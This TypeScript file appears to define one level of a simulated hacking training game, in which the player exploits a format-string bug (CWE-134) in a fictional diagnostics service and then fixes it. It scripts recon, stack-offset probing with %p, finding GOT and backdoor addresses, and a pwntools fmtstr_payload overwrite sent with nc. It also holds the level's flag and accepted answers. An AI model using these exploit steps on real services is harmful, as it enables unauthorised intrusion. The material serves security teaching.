import type { ChainDef } from "../../types";
import { match, strictCmd, matchesExactAddress, matchesExactOffset } from "../../engine";

const IP = "192.0.2.70";

export const ghostLevel7: ChainDef = {
  id: "ghost-7",
  difficulty: "ghost",
  order: 7,
  points: 300,
  title: "Whatever You Give It",
  codename: "GHOST ASSESSMENT — WHATEVER YOU GIVE IT",
  summary: "The service prints your message back using your message as the format string. That's not a display bug. That's a read and write primitive, if you know how to ask.",
  briefing: [
    `TARGET: Ashwell Diagnostics — ${IP}`,
    "OBJECTIVE: get a shell on the live service and prove it.",
    "",
    "Different bug class this time — no buffer overflow. A diagnostics daemon logs whatever you send",
    "it, straight back to you. Find out exactly how it does that.",
  ],
  debrief: [
    "root cause: diagd passed attacker-controlled input directly as the format string to printf()",
    "instead of using it as data (CWE-134). Format specifiers in the input were interpreted by printf",
    "itself — %x/%p read arbitrary stack values, and %n writes the number of bytes printed so far to",
    "an address of the attacker's choosing. With no full RELRO, the GOT was still writable at runtime,",
    "so a crafted %n write redirected a routine call straight into a hidden backdoor function.",
    "",
    "ASHWELL DIAGNOSTICS: SECURED.",
  ],
  nodes: [
    {
      id: "ashwell",
      org: "Ashwell Diagnostics",
      city: "Ashwell",
      state: "WY",
      coords: { x: 32.3, y: 19.5 },
      ip: IP,
      tagline: "Industrial diagnostics vendor",
      briefing: [`IP: ${IP}`, "No further information provided."],
      initialPrompt: "op@breachline:~$",
      motd: [],
      objectives: [
        { id: "recon", label: "Enumerate open services on the target", tactic: "Reconnaissance" },
        { id: "identify", label: "Locate and retrieve the exposed binary", tactic: "Discovery", requires: ["recon"] },
        { id: "analyze", label: "Determine the binary's memory protections", tactic: "Discovery", requires: ["identify"] },
        { id: "confirm-bug", label: "Confirm the service treats input as a format string, not data", tactic: "Discovery", requires: ["analyze"] },
        { id: "find-offset", label: "Find your input's direct parameter offset on the stack", tactic: "Discovery", requires: ["confirm-bug"] },
        { id: "find-got", label: "Find a GOT entry worth overwriting", tactic: "Discovery", requires: ["find-offset"] },
        { id: "find-winfunc", label: "Find the address of a hidden backdoor function", tactic: "Discovery", requires: ["find-got"] },
        { id: "exploit", label: "Overwrite the GOT entry to redirect execution into the backdoor", tactic: "Initial Access", requires: ["find-winfunc"] },
        { id: "loot", label: "Recover proof of shell access", tactic: "Collection", requires: ["exploit"] },
        { id: "secure", label: "Fix the format string call and rebuild with full RELRO", tactic: "Remediation", requires: ["loot"] },
      ],
      hints: [
        "if a program ever calls printf(your_input) instead of printf(\"%s\", your_input), your input isn't data anymore — it's instructions to printf itself.",
        "send something like AAAA%p%p%p%p%p%p and see which %p echoes back 0x4141414141414141 — that tells you exactly which positional parameter (%N$x, %N$n) reaches your own input.",
        "%n writes the number of bytes printed so far to an address you control — pwntools' fmtstr_payload(offset, {target_address: value}) builds that write for you once you know the offset. a GOT entry for a function that's about to be called is worth overwriting with the address of something more useful.",
      ],
      debrief: [],
      commands: [
        strictCmd({
          id: "nmap",
          tool: "nmap",
          requires: [IP],
          help: "nmap -sV <ip>",
          run: () => ({
            completesObjective: "recon",
            tone: "success",
            setsFlags: ["scanned"],
            output: [
              "PORT     STATE SERVICE VERSION",
              "80/tcp   open  http    nginx 1.24.0 (internal file share)",
              "6060/tcp open  unknown diagd (custom protocol)",
              "",
              "Nmap done: 1 IP address (1 host up) scanned in 4.20 seconds",
            ],
          }),
        }),
        strictCmd({
          id: "curl-files",
          tool: "curl",
          requires: ["http://" + IP],
          forbids: ["files/diagd"],
          help: "curl http://<ip>/files/",
          requiresFlags: ["scanned"],
          run: () => ({
            tone: "output",
            output: [
              "HTTP/1.1 200 OK",
              "",
              "<title>Internal Build Share</title>",
              '<a href="/files/diagd">diagd (release build, unstripped)</a>',
            ],
          }),
        }),
        strictCmd({
          id: "curl-download",
          tool: "curl",
          requires: ["http://" + IP, "files/diagd"],
          help: "curl -O http://<ip>/files/diagd",
          requiresFlags: ["scanned"],
          run: () => ({
            completesObjective: "identify",
            tone: "success",
            setsFlags: ["have_binary"],
            output: [
              "HTTP/1.1 200 OK",
              "Saving to: 'diagd'",
              "",
              "diagd: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped",
            ],
          }),
        }),
        strictCmd({
          id: "checksec",
          tool: "checksec",
          requires: ["diagd"],
          help: "checksec ./diagd",
          requiresFlags: ["have_binary"],
          run: () => ({
            completesObjective: "analyze",
            tone: "success",
            setsFlags: ["saw_protections"],
            output: [
              "CANARY    : disabled",
              "NX        : enabled",
              "PIE       : disabled",
              "RELRO     : none",
              "",
              "note: no RELRO at all — the GOT is still writable at runtime, not just at load time. worth",
              "remembering if you find a write primitive.",
            ],
          }),
        }),
        strictCmd({
          id: "nc-connect",
          tool: "nc",
          requires: [IP, "6060"],
          help: "nc <ip> 6060",
          requiresFlags: ["scanned"],
          run: () => ({
            tone: "output",
            output: ["diagd v1.4 — send a diagnostic message"],
          }),
        }),
        {
          id: "confirm-bug",
          tool: "echo",
          match: (input) => {
            const n = input.trim().toLowerCase();
            return n.includes("nc ") && n.includes(IP) && n.includes("6060") && /%x%x%x%x/.test(n);
          },
          help: 'echo "%x%x%x%x" | nc <ip> 6060',
          requiresFlags: ["saw_protections"],
          run: () => ({
            completesObjective: "confirm-bug",
            tone: "success",
            setsFlags: ["have_fmt_bug"],
            output: [
              "logged: 7ffe1a2b3c40.29a1.5573a0e01040.7ffe1a2b3d10",
              "",
              "[!] that's raw stack memory, not the literal text \"%x%x%x%x\" — this input is being used as",
              "    printf's format string, not printed as data.",
            ],
          }),
        },
        {
          id: "find-offset",
          tool: "echo",
          match: (input) => {
            const n = input.trim().toLowerCase();
            return n.includes("nc ") && n.includes(IP) && n.includes("6060") && /(%p){4,}/.test(n) && n.includes("aaaa");
          },
          help: 'echo "AAAA%p%p%p%p%p%p" | nc <ip> 6060',
          requiresFlags: ["have_fmt_bug"],
          run: () => ({
            completesObjective: "find-offset",
            tone: "success",
            setsFlags: ["have_offset"],
            note: "Ashwell diagd — direct parameter offset for attacker input: 6",
            output: [
              "logged: 0x7ffe1a2b3c40 0x1 0x5573a0e01040 0x7ffe1a2b3d10 0x100000000 0x4141414141414141",
              "",
              "[+] the 6th %p echoed back 0x4141414141414141 — 'AAAA' padded out to 8 bytes. offset 6 is",
              "    where your own input reaches printf's argument list.",
            ],
          }),
        },
        strictCmd({
          id: "find-got",
          tool: "objdump",
          requires: ["diagd", "exit"],
          help: "objdump -R ./diagd | grep exit",
          requiresFlags: ["have_offset"],
          run: () => ({
            completesObjective: "find-got",
            tone: "success",
            setsFlags: ["have_got_addr"],
            note: "Ashwell diagd — exit@got.plt: 0x0000000000404018",
            output: [
              "OFFSET           TYPE              VALUE",
              "0000000000404018 R_X86_64_JUMP_SLOT  exit@GLIBC_2.2.5",
              "",
              "[+] diagd calls exit() right after logging each message — that GOT entry runs on every",
              "    single request.",
            ],
          }),
        }),
        strictCmd({
          id: "find-winfunc",
          tool: "objdump",
          requires: ["diagd", "backdoor_shell"],
          help: "objdump -d ./diagd | grep backdoor_shell",
          requiresFlags: ["have_got_addr"],
          run: () => ({
            completesObjective: "find-winfunc",
            tone: "success",
            setsFlags: ["have_winfunc_addr"],
            note: "Ashwell diagd — hidden backdoor_shell() @ 0x0000000000401256",
            output: [
              "0000000000401256 <backdoor_shell>:",
              "  401256:  55                    push   %rbp",
              "  40125a:  48 8d 3d ...          lea    ... ; \"/bin/sh\"",
              "  401265:  e8 ...                call   system@plt",
              "",
              "note: backdoor_shell() exists in the binary but nothing ever calls it — unless something",
              "redirects a routine call there instead.",
            ],
          }),
        }),
        {
          id: "exploit",
          tool: "python3",
          match: (input) => {
            const n = input.toLowerCase();
            return (
              n.includes("fmtstr_payload") &&
              matchesExactOffset(n, 6) &&
              matchesExactAddress(n, "404018") &&
              matchesExactAddress(n, "401256") &&
              n.includes("nc ") &&
              n.includes(IP) &&
              matchesExactOffset(n, 6060)
            );
          },
          help: "python3 -c \"from pwn import *; print(fmtstr_payload(6, {0x404018: 0x401256}))\" | nc <ip> 6060",
          requiresFlags: ["have_winfunc_addr"],
          deniedOutput: ["you need the offset, the GOT target, and the backdoor's address before this does anything but print garbage."],
          run: () => ({
            completesObjective: "exploit",
            tone: "success",
            setsFlags: ["shell_access"],
            promptAfter: "diag@ashwell:~$",
            output: [
              "[+] crafted %n write payload sent — exit@got.plt overwritten with backdoor_shell()'s address",
              "[+] diagd finished logging and called what it thought was exit() — control flow landed in",
              "    backdoor_shell() instead",
              "",
              "[+] shell obtained via a format-string write primitive, no memory corruption bug needed",
              "    beyond the format string itself.",
            ],
          }),
        },
        strictCmd({
          id: "cat-flag",
          tool: "cat",
          requires: ["flag.txt"],
          help: "cat flag.txt",
          requiresFlags: ["shell_access"],
          run: () => ({
            completesObjective: "loot",
            tone: "success",
            note: "Ashwell Diagnostics — flag.txt: eccbc87e4b5ce2fe28308fd9f2a7baf3",
            output: ["eccbc87e4b5ce2fe28308fd9f2a7baf3"],
          }),
        }),
        {
          id: "secure",
          tool: "secure",
          match: match.startsWith("secure system", "secure", "remediate"),
          help: "secure system",
          requiresObjectives: ["loot"],
          deniedOutput: ["confirm shell access before you file the fix."],
          run: () => ({
            completesObjective: "secure",
            tone: "success",
            output: [
              "[+] fixed the vulnerable call to printf(\"%s\", message) instead of printf(message)",
              "[+] removed the unused backdoor_shell() function entirely",
              "[+] rebuilt with full RELRO so the GOT is read-only after load",
              "",
              "ASHWELL DIAGNOSTICS: SECURED",
            ],
          }),
        },
      ],
    },
  ],
};
